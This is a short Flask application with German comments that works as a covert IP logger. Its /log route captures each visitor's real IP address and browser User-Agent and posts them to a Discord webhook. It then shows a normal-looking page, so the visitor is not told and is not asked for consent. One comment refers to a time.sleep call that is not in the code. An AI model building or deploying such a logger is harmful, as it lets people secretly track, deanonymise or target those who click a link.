from flask import Flask, request, render_template
import requests
import os
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)

# WICHTIG: Proxy-Fix aktivieren
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

WEBHOOK_URL = "https://discord.com/api/webhooks/..."

@app.route('/log')
def log_ip():
    ip = request.remote_addr          # sollte jetzt die echte IP sein
    user_agent = request.headers.get('User-Agent')
    data = {"content": f"**IP-LOG:** {ip} | {user_agent}"}
    try:
        r = requests.post(WEBHOOK_URL, json=data, timeout=10)
        print("Webhook Status:", r.status_code)
    except Exception as e:
        print("Error:", str(e))
    
    return render_template('index.html')  # time.sleep danach entfernen, ist tot
